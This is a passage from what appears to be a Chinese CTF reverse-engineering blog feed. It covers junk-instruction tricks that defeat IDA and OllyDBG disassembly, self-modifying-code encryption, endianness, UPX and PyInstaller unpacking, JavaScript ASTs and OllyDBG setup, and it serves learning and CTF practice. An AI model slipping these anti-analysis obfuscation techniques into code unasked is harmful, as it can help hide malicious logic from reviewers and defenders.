<code>Hello World!</code><br>但是在 IDA 中，IDA 已经无法正确解析这段代码：<br><img src="https://s2.loli.net/2023/03/18/s96JnKrg1o5tlYW.png" alt="NSSCTF-jump_by_jump2.png"></p></li><li><p><strong>示例 2：</strong></p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>_asm <span class="token punctuation">&#123;</span>xor eax<span class="token punctuation">,</span> eax<span class="token punctuation">;</span>jz s<span class="token punctuation">;</span>add esp<span class="token punctuation">,</span> <span class="token number">0x11</span><span class="token punctuation">;</span>s<span class="token operator">:</span><span class="token punctuation">&#125;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hello World!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>插入的花指令也可以是改变堆栈平衡的汇编代码，虽然这里的花指令不会被执行，但是 IDA 进行解析时会认为该函数堆栈不平衡，从而使 <code>F5</code> 功能失效</p></li></ul><hr><h2 id="花指令的实现方式"><a href="#花指令的实现方式" class="headerlink" title="花指令的实现方式"></a>花指令的实现方式</h2><h3 id="简单jmp"><a href="#简单jmp" class="headerlink" title="简单jmp"></a>简单jmp</h3><ul><li>这是最简单的花指令。OD 能被骗过去，但是因为 IDA 采用的是递归扫描法，所以能够正常识别<pre class="language-c" data-language="c"><code class="language-c">__asm<span class="token punctuation">&#123;</span>jmp label1db junkcodelabel1<span class="token operator">:</span>    <span class="token punctuation">&#125;</span></code></pre></li></ul><h3 id="多层跳转"><a href="#多层跳转" class="headerlink" title="多层跳转"></a>多层跳转</h3><ul><li>本质上和简单跳转是一样的，只是加了几层跳转。无法干扰 IDA<pre class="language-c" data-language="c"><code class="language-c">start<span class="token operator">:</span>   <span class="token comment">//花指令开始</span>    jmp label1    DB junkcodelabel1<span class="token operator">:</span>     jmp label2     DB junkcodelabel2：    jmp label3    DB junkcodelabel3   </code></pre></li></ul><h3 id="jnx-和-jx-条件跳转"><a href="#jnx-和-jx-条件跳转" class="headerlink" title="jnx 和 jx 条件跳转"></a>jnx 和 jx 条件跳转</h3><ul><li>利用 jz 和 jnz 的互补条件跳转指令来代替 jmp。无法干扰吾爱破解版 OllyDBG，但 IDA 不能正常识别<pre class="language-c" data-language="c"><code class="language-c">_asm<span class="token punctuation">&#123;</span>    jz label1    jnz label1    db junkcodelabel1<span class="token operator">:</span>    <span class="token punctuation">&#125;</span></code></pre></li></ul><h3 id="永真条件跳转"><a href="#永真条件跳转" class="headerlink" title="永真条件跳转"></a>永真条件跳转</h3><ul><li>通过设置永真或永假的条件，导致程序一定会执行。也可以调用某些会返回确定值的函数，来达到构造永真或永假条件。这种方式 IDA 和 OD 都无法正常识别<pre class="language-c" data-language="c"><code class="language-c">__asm<span class="token punctuation">&#123;</span>    push ebx    xor ebx<span class="token punctuation">,</span>ebx    test ebx<span class="token punctuation">,</span>ebx    jnz label1    jz label2label1<span class="token operator">:</span>    _emit junkcodelabel2<span class="token operator">:</span>   pop ebx   <span class="token comment">//需要恢复ebx寄存器    </span><span class="token punctuation">&#125;</span>__asm<span class="token punctuation">&#123;</span>clcjnz label1<span class="token operator">:</span>_emit junkcodelabel1<span class="token operator">:</span><span class="token punctuation">&#125;</span></code></pre></li></ul><h3 id="call-amp-ret-构造花指令"><a href="#call-amp-ret-构造花指令" class="headerlink" title="call &amp; ret 构造花指令"></a>call &amp; ret 构造花指令</h3><ul><li>利用 call 和 ret，在函数中修改返回地址，达到跳过 thunkcode 到正常流程的目的。可以干扰 IDA 的正常识别</li></ul><blockquote><p><code>call 指令</code>：将下一条指令地址压入栈，再跳转执行<br><code>ret 指令</code>：将保存的地址取出，跳转执行</p></blockquote><pre class="language-c" data-language="c"><code class="language-c">__asm<span class="token punctuation">&#123;</span>    call label1    _emit junkcodelabel1<span class="token operator">:</span>    add dword ptr ss<span class="token operator">:</span><span class="token punctuation">[</span>esp<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">8</span>   <span class="token comment">//具体增加多少根据调试来</span>    ret    _emit junkcode<span class="token punctuation">&#125;</span></code></pre><h3 id="汇编指令共用-opcode"><a href="#汇编指令共用-opcode" class="headerlink" title="汇编指令共用 opcode"></a>汇编指令共用 opcode</h3><ul><li>jmp 的指令是 <code>inc eax</code> 的第一个字节，<code>inc eax</code> 和 <code>dec eax</code> 抵消影响。这种共用 opcode 的方法比较麻烦<br>  <img src="https://s2.loli.net/2023/03/17/FMXUuecd8JoTAV7.png" alt="CTF - Reverse_花指令5.png"><img src="https://s2.loli.net/2023/03/17/sNhcongQPjmZKHG.png" alt="CTF - Reverse_花指令6.png"></li></ul><hr>]]></content>
      
      
      <categories>
          
          <category> 逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF笔记 </tag>
            
            <tag> REVERSE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>大端序和小端序</title>
      <link href="/2023/03fa84c0bb.html"/>
      <url>/2023/03fa84c0bb.html</url>
      
        <content type="html"><![CDATA[<h2 id="字节存储顺序"><a href="#字节存储顺序" class="headerlink" title="字节存储顺序"></a>字节存储顺序</h2><blockquote><p>主要分为 大端序（Big-endian）和小端序（Little-endian），区别如下：<br><mark>大端序</mark>：<code>高位字节 -&gt; 低地址</code>，低位字节 -&gt; 高地址<br><mark>小端序</mark>：<code>低位字节 -&gt; 低地址</code>，高位字节 -&gt; 高地址</p></blockquote><hr><h3 id="图解"><a href="#图解" class="headerlink" title="图解"></a>图解</h3><p><img src="https://s2.loli.net/2023/03/17/279vjKFm3txQDk6.png" alt="CTF - Reverse_大端序和小端序1.png"></p><blockquote><p><em><strong>不管是大端法还是小端法存储，计算机在内存中存放数据的顺序都是从低地址到高地址</strong></em><br><em><strong>不同的是，取低字节的数据存放在低地址，还是取高字节数据存放在低地址</strong></em></p></blockquote><ul><li><strong>若为常见的大小类型（如 int）， 则是 顺序（高位在左）</strong></li><li><strong>若为其他的大小类型（如 int64），则是 逆序（高位在右）</strong></li></ul><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><ul><li>例如，将 <code>12345678h</code> 写入 <code>1000h</code> 开始的内存中，以大端序和小端序模式存放结果如下：<br><img src="https://s2.loli.net/2023/03/17/Pm2r6WLoHw5vuDc.png" alt="CTF - Reverse_大端序和小端序2.png"></li></ul><ol><li>在小端顺序里， <code>v1 = 0x12345678</code> 在内存的字节码中看起来是这样 <code>78h 56h 34h 12h</code>，这没有问题<br>如果这时有 <code>v2 = 0x1234</code>，在内存的字节码中看起来是 <code>34h 12h</code></li><li>假如 <code>v2</code> 后面紧接着 <code>v1</code> 的话，字节码应该就是 <code>34h 12h 78h 56h 34h 12h</code><br>再放一个 <code>v3 = 0x12</code> 的话，总的排序就是 <code>12h 34h 12h 78h 56h 34h 12h</code></li></ol><blockquote><p>一般来说，x86 系列 CPU 都是 Little-endian 字节序，PowerPC 通常是 Big-endian 字节序<br>但是对于 [1, 2, 3, 4] 这么一个数组，并不会受到字节序的影响。它的排序无论大端序还是小端序都是一样的</p></blockquote><hr><h2 id="IDA-中的小端序"><a href="#IDA-中的小端序" class="headerlink" title="IDA 中的小端序"></a>IDA 中的小端序</h2><h3 id="DWORD"><a href="#DWORD" class="headerlink" title="_DWORD"></a>_DWORD</h3><ul><li>在 IDA 中，F5 查看伪代码后，如果看到：<pre class="language-c" data-language="c"><code class="language-c">_DWORD v4<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">;</span>v4<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xD6C0B67</span><span class="token punctuation">;</span>v4<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x175F4078</span><span class="token punctuation">;</span>v4<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x3302058</span><span class="token punctuation">;</span>v4<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x725D1244</span><span class="token punctuation">;</span>v4<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x2E1F3441</span><span class="token punctuation">;</span>v4<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x6847404D</span><span class="token punctuation">;</span>v4<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x1B</span><span class="token punctuation">;</span></code></pre><blockquote><p>注意最开始的数据类型，这个数组<strong>不仅要按照4字节左侧补零对齐，还要将每一组数据翻转拼接才能得到正确的字符串</strong>，IDA 并没有非常智能地捋顺字符串，所以初学的话非常有迷惑性</p><p>例如：<br><code>v4[2] = 0x3302058；</code><br>应为 <code>0x03302058 --&gt; 0x58，0x20，0x30，0x03</code></p></blockquote></li></ul><hr><h3 id="db、dw、dd、dq"><a href="#db、dw、dd、dq" class="headerlink" title="db、dw、dd、dq"></a>db、dw、dd、dq</h3><blockquote><p>伪指令 db、dw、dd、dq 都可以定义字符串，但最多的是用 db 来定义字符串</p></blockquote><ol><li>第一个原因是 dw、dd定义的字符串到了内存中排序是相反的<ul><li><strong>在字符串 “abcd” 中，元素按从 高位 向 低位 线性排序</strong></li><li><strong>在内存中，数据由 低位 向 高位 线性排序</strong></li><li>因此字符串 “abcd” 在内存中的顺序是从 低位 向 高位 排序的，所以相反，即 小端序</li></ul></li><li>第二个原因是 不同版本编译器对 dw 与 dd 定义字符串的指令格式支持不一样<ul><li>db 定义字节类型变量，一个字节数据占 1个 字节单元，读完一个，偏移量加 1 （ 1个 十六进制数）</li><li>dw 定义字类型变量，一个字数据占 2个 字节单元，读完一个，偏移量加 2 （ 2个 十六进制数）</li><li>dd 定义双字类型变量，一个双字数据占 4个 字节单元，读完一个，偏移量加 4 （ 4个 十六进制数）</li><li>dq 定义四字类型变量，一个四字数据占 8个 字节单元，读完一个，偏移量加 8 （ 8个 十六进制数）</li></ul></li><li><strong>db 是一字节，按顺序一个一个存储</strong><ul><li><em>用 db 定义字符串时，存储方式是顺着的，即 大端序</em></li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> 逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF笔记 </tag>
            
            <tag> REVERSE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>UPX脱壳</title>
      <link href="/2023/03f804fd94.html"/>
      <url>/2023/03f804fd94.html</url>
      
        <content type="html"><![CDATA[<h2 id="upx-脱壳工具下载地址"><a href="#upx-脱壳工具下载地址" class="headerlink" title="upx 脱壳工具下载地址"></a>upx 脱壳工具下载地址</h2><blockquote><p><a href="https://fossies.org/windows/misc/upx-3.96-win64.zip/">upx 3.96-win64 - Download</a></p></blockquote><hr><h2 id="脱壳操作"><a href="#脱壳操作" class="headerlink" title="脱壳操作"></a>脱壳操作</h2><ol><li><p>将加壳文件置于解压后的 <code>D:\upx-3.96-win64</code> 文件夹下</p></li><li><p>脱壳语句：</p><blockquote><p>upx -d &lt;脱壳文件名&gt;</p></blockquote></li></ol><p><img src="https://s2.loli.net/2023/03/17/ID3qzT9Nl6f85B1.png" alt="CTF - Reverse_upx 脱壳1.png"></p>]]></content>
      
      
      <categories>
          
          <category> 逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF笔记 </tag>
            
            <tag> REVERSE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SMC自解码</title>
      <link href="/2023/039c712030.html"/>
      <url>/2023/039c712030.html</url>
      
        <content type="html"><![CDATA[<h2 id="SMC"><a href="#SMC" class="headerlink" title="SMC"></a>SMC</h2><blockquote><p><strong>自修改代码</strong>，简而言之，就是程序中的部分代码在运行之前被加密成一段数据，不可反编译，通过程序运行后执行相关的解码功能，对加密的代码数据进行解密，让其恢复正常功能</p></blockquote><hr><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><ul><li>代码在二进制文件中就是字节码，本身也就是一段二进制数据</li><li>提前手动将要修改的代码部分替换为加密数据，运行自己的函数对修改部分进行解码</li><li>通过这种方式，对核心代码进行 <code>SMC</code> 加密，<em>程序在被静态反编译的时候，核心代码就是一串数据无法反编译，而程序在运行的时候又能成功将这段核心代码复原</em>。从而实现保护程序，同时亦可以将一些特征代码变形隐藏</li></ul><hr><h2 id="实现方法"><a href="#实现方法" class="headerlink" title="实现方法"></a>实现方法</h2><blockquote><p>写在前面：在自己实现 <code>SMC</code> 时，一定注意 <code>SMC</code> 加解密代码所属的节区是否有<strong>可写权限</strong></p></blockquote><ol><li>有两个函数，一个函数加密，一个函数解密，两者对应</li><li>找到要进行 <code>SMC</code> 的代码地址，然后事先在程序开始的地方设置：对该地址数据的解密函数</li><li>取出要进行 <code>SMC</code> 的代码的字节码，对其进行加密操作得到一串加密数据</li><li>用这串加密数据替换原代码的字节码</li></ol><hr>]]></content>
      
      
      <categories>
          
          <category> 逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF笔记 </tag>
            
            <tag> REVERSE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python逆向</title>
      <link href="/2023/0319655b58.html"/>
      <url>/2023/0319655b58.html</url>
      
        <content type="html"><![CDATA[<h2 id="Python逆向特点"><a href="#Python逆向特点" class="headerlink" title="Python逆向特点"></a>Python逆向特点</h2><ul><li>在 exeinfo pe 中查看到文件信息：<br><img src="https://s2.loli.net/2023/03/17/fS2HF8Oa6CUBYtP.png" alt="CTF - Reverse_Python逆向1.png"></li><li><mark>在文件信息中出现 PyInstaller 即为 Python 文件经过 pyinstaller 打包生成的可执行 .exe 文件</mark></li><li>这类由 Python 生成的可执行文件无法通过 IDA 反编译，需要使用 pyinstxtractor.py 文件进行解包得到 Python 的反编译文件 .pyc</li></ul><hr><h2 id="Python-逆向流程"><a href="#Python-逆向流程" class="headerlink" title="Python 逆向流程"></a>Python 逆向流程</h2><ul><li>下载 pyinstxtractor.py 工具包<br><img src="https://s2.loli.net/2023/03/17/A7Nq8RfxQdyTu25.png" alt="CTF - Reverse_Python逆向2.png"></li></ul><ol><li>将 pyinstxtractor.py 文件置于 pyinstaller 打包成的 .exe 文件夹下</li><li>在该目录下执行 cmd，输入：<br> <code>python pyinstxtractor.py &lt;exe 文件名&gt;</code></li><li>转换后会在该目录下生成一个文件夹，其中必定存在一个无后缀名的 struct 文件，通过 exeinfo pe 可查看该文件为 .pyc 文件<mark>【必要时可用它恢复文件头】</mark></li></ol><hr><h2 id="pyc-反编译"><a href="#pyc-反编译" class="headerlink" title="pyc 反编译"></a>pyc 反编译</h2><ul><li>在 .pyc 文件目录下，执行 cmd：<br>  <code>uncompyle6 &lt; pyc 文件名&gt;</code><br>  <code>uncompyle6 -o &lt; py 文件名&gt; &lt; pyc 文件名&gt;</code></li><li>若 Python 版本不对，会提示 KeyError: ‘3.10.4’ （ 3.10.4 为 Python 版本）</li></ul><hr><h2 id="获取-pyc-文件头"><a href="#获取-pyc-文件头" class="headerlink" title="获取 pyc 文件头"></a>获取 pyc 文件头</h2><ul><li><p>方法一：<br>通过 Pycharm 手动生成 .pyc 文件，获取文件头，代码如下：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># 代码开头需导入py_compile</span><span class="token keyword">import</span> py_compile<span class="token comment"># 随意写正确的python代码即可</span><span class="token keyword">def</span> <span class="token function">print_hi</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'Hi, </span><span class="token interpolation"><span class="token punctuation">&#123;</span>name<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>print_hi<span class="token punctuation">(</span><span class="token string">'PyCharm'</span><span class="token punctuation">)</span><span class="token comment"># 最后调用该函数进行编译操作，单引号中是保存路径</span>py_compile<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'D:\py_project'</span><span class="token punctuation">)</span></code></pre></li><li><p>方法二：<br>通过 cmd 命令生成 .pyc 文件<br>  <code>python -m py_compile &lt;py 文件名&gt;</code></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF笔记 </tag>
            
            <tag> REVERSE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JS逆向</title>
      <link href="/2023/03debddada.html"/>
      <url>/2023/03debddada.html</url>
      
        <content type="html"><![CDATA[<h2 id="抽象语法树-AST"><a href="#抽象语法树-AST" class="headerlink" title="抽象语法树 AST"></a>抽象语法树 AST</h2><blockquote><p>源代码的抽象语法结构的树状表示，树上的每个节点都表示源代码中的一种结构</p><p>抽象表示把 js 代码进行了结构化的转化，转化为一种数据结构。这种数据结构其实就是一个大的 json 对象</p></blockquote><blockquote><p>简单理解，就是<strong>把代码按照一定的规则转换成一种树形结构</strong></p></blockquote><hr><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><ol><li>一组简单的 AST 树状结构，转换前：<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> team <span class="token operator">=</span> <span class="token string">'我是一个示例'</span></code></pre>转换后：<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">&#123;</span>  <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"Program"</span><span class="token punctuation">,</span>  <span class="token string-property property">"start"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token string-property property">"end"</span><span class="token operator">:</span> <span class="token number">18</span><span class="token punctuation">,</span>  <span class="token string-property property">"body"</span><span class="token operator">:</span> <span class="token punctuation">[</span>    <span class="token punctuation">&#123;</span>      <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"VariableDeclaration"</span><span class="token punctuation">,</span>      <span class="token string-property property">"start"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>      <span class="token string-property property">"end"</span><span class="token operator">:</span> <span class="token number">18</span><span class="token punctuation">,</span>      <span class="token string-property property">"declarations"</span><span class="token operator">:</span> <span class="token punctuation">[</span>        <span class="token punctuation">&#123;</span>          <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"VariableDeclarator"</span><span class="token punctuation">,</span>          <span class="token string-property property">"start"</span><span class="token operator">:</span> <span class="token number">6</span><span class="token punctuation">,</span>          <span class="token string-property property">"end"</span><span class="token operator">:</span> <span class="token number">18</span><span class="token punctuation">,</span>          <span class="token string-property property">"id"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"Identifier"</span><span class="token punctuation">,</span>            <span class="token string-property property">"start"</span><span class="token operator">:</span> <span class="token number">6</span><span class="token punctuation">,</span>            <span class="token string-property property">"end"</span><span class="token operator">:</span> <span class="token number">8</span><span class="token punctuation">,</span>            <span class="token string-property property">"name"</span><span class="token operator">:</span> <span class="token string">"team"</span>          <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>          <span class="token string-property property">"init"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"Literal"</span><span class="token punctuation">,</span>            <span class="token string-property property">"start"</span><span class="token operator">:</span> <span class="token number">11</span><span class="token punctuation">,</span>            <span class="token string-property property">"end"</span><span class="token operator">:</span> <span class="token number">18</span><span class="token punctuation">,</span>            <span class="token string-property property">"value"</span><span class="token operator">:</span> <span class="token string">"我是一个示例"</span><span class="token punctuation">,</span>            <span class="token string-property property">"raw"</span><span class="token operator">:</span> <span class="token string">"'我是一个示例'"</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">]</span><span class="token punctuation">,</span>      <span class="token string-property property">"kind"</span><span class="token operator">:</span> <span class="token string">"const"</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token string-property property">"sourceType"</span><span class="token operator">:</span> <span class="token string">"module"</span><span class="token punctuation">&#125;</span></code></pre></li><li>拆解一个简单的 add 函数，转换前：<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">return</span> a <span class="token operator">+</span> b<span class="token punctuation">&#125;</span></code></pre>转换后：<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">&#123;</span>  <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"Program"</span><span class="token punctuation">,</span>  <span class="token string-property property">"start"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token string-property property">"end"</span><span class="token operator">:</span> <span class="token number">38</span><span class="token punctuation">,</span>  <span class="token string-property property">"body"</span><span class="token operator">:</span> <span class="token punctuation">[</span>    <span class="token punctuation">&#123;</span>      <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"FunctionDeclaration"</span><span class="token punctuation">,</span>      <span class="token string-property property">"start"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>      <span class="token string-property property">"end"</span><span class="token operator">:</span> <span class="token number">38</span><span class="token punctuation">,</span>      <span class="token string-property property">"id"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"Identifier"</span><span class="token punctuation">,</span>        <span class="token string-property property">"start"</span><span class="token operator">:</span> <span class="token number">9</span><span class="token punctuation">,</span>        <span class="token string-property property">"end"</span><span class="token operator">:</span> <span class="token number">12</span><span class="token punctuation">,</span>        <span class="token string-property property">"name"</span><span class="token operator">:</span> <span class="token string">"add"</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token string-property property">"expression"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>      <span class="token string-property property">"generator"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>      <span class="token string-property property">"async"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>      <span class="token string-property property">"params"</span><span class="token operator">:</span> <span class="token punctuation">[</span>        <span class="token punctuation">&#123;</span>          <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"Identifier"</span><span class="token punctuation">,</span>          <span class="token string-property property">"start"</span><span class="token operator">:</span> <span class="token number">13</span><span class="token punctuation">,</span>          <span class="token string-property property">"end"</span><span class="token operator">:</span> <span class="token number">14</span><span class="token punctuation">,</span>          <span class="token string-property property">"name"</span><span class="token operator">:</span> <span class="token string">"a"</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token punctuation">&#123;</span>          <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"Identifier"</span><span class="token punctuation">,</span>          <span class="token string-property property">"start"</span><span class="token operator">:</span> <span class="token number">16</span><span class="token punctuation">,</span>          <span class="token string-property property">"end"</span><span class="token operator">:</span> <span class="token number">17</span><span class="token punctuation">,</span>          <span class="token string-property property">"name"</span><span class="token operator">:</span> <span class="token string">"b"</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">]</span><span class="token punctuation">,</span>      <span class="token string-property property">"body"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"BlockStatement"</span><span class="token punctuation">,</span>        <span class="token string-property property">"start"</span><span class="token operator">:</span> <span class="token number">19</span><span class="token punctuation">,</span>        <span class="token string-property property">"end"</span><span class="token operator">:</span> <span class="token number">38</span><span class="token punctuation">,</span>        <span class="token string-property property">"body"</span><span class="token operator">:</span> <span class="token punctuation">[</span>          <span class="token punctuation">&#123;</span>            <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"ReturnStatement"</span><span class="token punctuation">,</span>            <span class="token string-property property">"start"</span><span class="token operator">:</span> <span class="token number">24</span><span class="token punctuation">,</span>            <span class="token string-property property">"end"</span><span class="token operator">:</span> <span class="token number">36</span><span class="token punctuation">,</span>            <span class="token string-property property">"argument"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"BinaryExpression"</span><span class="token punctuation">,</span>              <span class="token string-property property">"start"</span><span class="token operator">:</span> <span class="token number">31</span><span class="token punctuation">,</span>              <span class="token string-property property">"end"</span><span class="token operator">:</span> <span class="token number">36</span><span class="token punctuation">,</span>              <span class="token string-property property">"left"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"Identifier"</span><span class="token punctuation">,</span>                <span class="token string-property property">"start"</span><span class="token operator">:</span> <span class="token number">31</span><span class="token punctuation">,</span>                <span class="token string-property property">"end"</span><span class="token operator">:</span> <span class="token number">32</span><span class="token punctuation">,</span>                <span class="token string-property property">"name"</span><span class="token operator">:</span> <span class="token string">"a"</span>              <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>              <span class="token string-property property">"operator"</span><span class="token operator">:</span> <span class="token string">"+"</span><span class="token punctuation">,</span>              <span class="token string-property property">"right"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"Identifier"</span><span class="token punctuation">,</span>                <span class="token string-property property">"start"</span><span class="token operator">:</span> <span class="token number">35</span><span class="token punctuation">,</span>                <span class="token string-property property">"end"</span><span class="token operator">:</span> <span class="token number">36</span><span class="token punctuation">,</span>                <span class="token string-property property">"name"</span><span class="token operator">:</span> <span class="token string">"b"</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">]</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token string-property property">"sourceType"</span><span class="token operator">:</span> <span class="token string">"module"</span><span class="token punctuation">&#125;</span></code></pre></li></ol><hr><h3 id="生成抽象语法树"><a href="#生成抽象语法树" class="headerlink" title="生成抽象语法树"></a>生成抽象语法树</h3><ul><li>在线网站：<a href="https://astexplorer.net/">AST explorer</a></li></ul><hr><h2 id="语法树还原成代码"><a href="#语法树还原成代码" class="headerlink" title="语法树还原成代码"></a>语法树还原成代码</h2><blockquote><p>用 <code>escodegen</code> 将 JavaScript AST 转化为代码</p></blockquote><ol><li>使用 npm 命令安装 escodegen 模块：<br> <code>npm i escodegen -g</code></li><li>使用 escodegen 将 js 语句的 AST 语法树 —— json 文件转化成 js 代码：<br> <code>esgenerate &lt; json 文件名&gt;</code></li></ol><hr><h2 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h2><ul><li>得到的 js 代码可以直接 F12 后在浏览器的控制台中运行<br><img src="https://s2.loli.net/2023/03/27/FHsKVdUpzAlNx25.png" alt="CTF - REVERSE_JS逆向1.png"></li></ul>]]></content>
      
      
      <categories>
          
          <category> 逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF笔记 </tag>
            
            <tag> REVERSE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OllyDBG的基础和使用</title>
      <link href="/2023/03d8e4388f.html"/>
      <url>/2023/03d8e4388f.html</url>
      
        <content type="html"><![CDATA[<h2 id="OllyDBG-的下载安装"><a href="#OllyDBG-的下载安装" class="headerlink" title="OllyDBG 的下载安装"></a>OllyDBG 的下载安装</h2><blockquote><p>推荐使用从<a href="https://www.52pojie.cn/">吾爱破解论坛</a>下载的吾爱破解专用版OllyDBG，该版本具有强大的对抗反调试的功能</p></blockquote><ol><li>下载地址： <a href="http://down.52pojie.cn/Tools/Debuggers/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E4%B8%93%E7%94%A8%E7%89%88Ollydbg.rar">吾爱破解专用版OllyDBG</a></li><li>解压后复制到想放置的路径下，执行 <code>&quot;Udd Cleaner.exe&quot;</code> 、<code>&quot;路径修复工具.exe&quot;</code></li><li>以管理员权限运行 <code>&quot;吾爱破解[LCG].exe&quot;</code> 即可使用</li><li>注意：<mark>“OllyDBG.EXE” 是英文版本，”吾爱破解[LCG].exe” 为全汉化</mark></li></ol><hr><h2 id="OllyDBG-界面"><a href="#OllyDBG-界面" class="headerlink" title="OllyDBG 界面"></a>OllyDBG 界面</h2><blockquote><p>初始界面为：”LCG - 主线程，模块” 窗口</p></blockquote><p><img src="https://s2.loli.net/2023/03/17/OZlFD46pGIxSwKr.png" alt="OllyDBG和GDB_OllyDBG界面1.png"></p><ul><li><p><strong>反汇编窗口</strong><br>  载入程序后，窗口内显示的是程序反汇编后的源代码</p></li><li><p><strong>信息窗口</strong><br>  进行动态调试时，窗口内会显示出当前代码行的各个寄存器的信息，或者 API 函数的调用、跳转等信息，可以用来辅助了解当前代码行的寄存器的运行情况</p></li><li><p><strong>数据窗口</strong><br>  默认以十六进制的方式显示内存中的数据</p></li><li><p><strong>寄存器窗口</strong><br>  动态显示 CPU 